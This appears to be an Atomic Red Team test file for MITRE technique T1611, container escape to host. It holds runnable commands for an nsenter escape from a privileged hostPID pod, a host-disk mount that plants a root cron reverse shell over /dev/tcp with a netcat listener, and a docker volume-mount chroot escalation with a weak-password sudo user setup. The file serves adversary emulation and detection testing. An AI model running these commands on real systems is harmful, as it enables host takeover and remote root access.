{
  "attack_technique": "T1611",
  "display_name": "Escape to Host",
  "atomic_tests": [
    {
      "name": "Deploy container using nsenter container escape",
      "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/",
      "supported_platforms": [
        "containers"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'",
        "cleanup_command": "kubectl --context kind-atomic-cluster delete pod atomic-escape-pod"
      },
      "input_arguments": {},
      "dependencies": [
        {
          "description": "Verify docker is installed.",
          "prereq_command": "which docker",
          "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi"
        },
        {
          "description": "Verify docker service is running.",
          "prereq_command": "sudo systemctl status docker",
          "get_prereq_command": "sudo systemctl start docker"
        },
        {
          "description": "Verify kind is in the path.",
          "prereq_command": "which kind",
          "get_prereq_command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind"
        },
        {
          "description": "Verify kind-atomic-cluster is created",
          "prereq_command": "sudo kind get clusters",
          "get_prereq_command": "sudo kind create cluster --name atomic-cluster"
        },
        {
          "description": "Verify kubectl is in path",
          "prereq_command": "which kubectl",
          "get_prereq_command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl"
        }
      ],
      "auto_generated_guid": "0b2f9520-a17a-4671-9dba-3bd034099fff"
    },
    {
      "name": "Mount host filesystem to escape privileged Docker container",
      "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell.",
      "supported_platforms": [
        "containers"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" >> #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" >> #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'\" >> #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2>&1",
        "cleanup_command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}"
      },
      "input_arguments": {
        "mount_device": {
          "description": "Path to the device of the host's disk to mount",
          "type": "path",
          "default": "/dev/dm-0"
        },
        "mount_point": {
          "description": "Path where the host filesystem will be mounted",
          "type": "path",
          "default": "/mnt/T1611.002"
        },
        "cron_path": {
          "description": "Path on the host filesystem where cron jobs are stored",
          "type": "path",
          "default": "/etc/cron.d"
        },
        "cron_filename": {
          "description": "Filename of the cron job in cron_path",
          "type": "string",
          "default": "T1611_002"
        },
        "listen_address": {
          "description": "IP address to listen for callback from the host system.",
          "type": "string",
          "default": "`ifconfig eth0"
        },
        "listen_port": {
          "description": "TCP Port to listen on for callback from the host system.",
          "type": "integer",
          "default": "4444"
        }
      },
      "dependencies": [
        {
          "description": "Verify mount is installed.",
          "prereq_command": "which mount",
          "get_prereq_command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi"
        },
        {
          "description": "Verify container is privileged.",
          "prereq_command": "capsh --print | grep cap_sys_admin",
          "get_prereq_command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi"
        },
        {
          "description": "Verify mount device (/dev/dm-0) exists.",
          "prereq_command": "ls #{mount_device}",
          "get_prereq_command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi"
        },
        {
          "description": "Netcat is installed.",
          "prereq_command": "which netcat",
          "get_prereq_command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi"
        },
        {
          "description": "IP Address is known.",
          "prereq_command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi",
          "get_prereq_command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi"
        }
      ],
      "auto_generated_guid": "6c499943-b098-4bc6-8d38-0956fc182984"
    },
    {
      "name": "Privilege Escalation via Docker Volume Mapping",
      "description": "This test demonstrates privilege escalation by abusing Docker's volume mapping\nfeature to gain access to the host file system. By mounting the root directory\nof the host into a Docker container, the attacker can use chroot to operate as\nroot on the host system.",
      "supported_platforms": [
        "containers"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "command": "echo \"Current user: #{username}\"\nsudo -u docker_user sh -c \"sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id\"",
        "cleanup_command": "USERNAME=\"#{username}\"; SUDOERS_FILE=\"/etc/sudoers.d/$USERNAME\"; id \"$USERNAME\" &>/dev/null && userdel -r \"$USERNAME\" && echo -e \"$USERNAME is deleted.\"; [[ -f \"$SUDOERS_FILE\" ]] && rm -f \"$SUDOERS_FILE\"; echo \"Cleanup complete.\""
      },
      "input_arguments": {
        "username": {
          "description": "Username that run attack command",
          "type": "string",
          "default": "docker_user"
        }
      },
      "dependencies": [
        {
          "description": "Docker",
          "prereq_command": "command -v docker &> /dev/null && echo \"Docker is installed\" || { echo \"Docker is not installed.\"; exit 1; }",
          "get_prereq_command": "echo \"You should install docker manually.\""
        },
        {
          "description": "Docker Privileged User",
          "prereq_command": "sudo -l -U #{username} | grep \"(ALL) NOPASSWD: /usr/bin/docker\"",
          "get_prereq_command": "USERNAME=\"#{username}\"\nPASSWORD=\"password123\"\nSUDO_COMMAND=\"/usr/bin/docker\"\nSUDOERS_FILE=\"/etc/sudoers.d/$USERNAME\"\n[[ $EUID -ne 0 ]] && echo \"Run as root.\" && exit 1; id \"$USERNAME\" &>/dev/null || { useradd -m -s /bin/bash \"$USERNAME\" && echo \"$USERNAME:$PASSWORD\" | chpasswd; }; [[ -f \"$SUDOERS_FILE\" ]] || { echo \"$USERNAME ALL=(ALL) NOPASSWD: $SUDO_COMMAND\" > \"$SUDOERS_FILE\" && chmod 440 \"$SUDOERS_FILE\"; }; echo \"Setup complete. User: $USERNAME, Password: $PASSWORD\""
        }
      ],
      "auto_generated_guid": "39fab1bc-fcb9-406f-bc2e-fe03e42ff0e4"
    }
  ]
}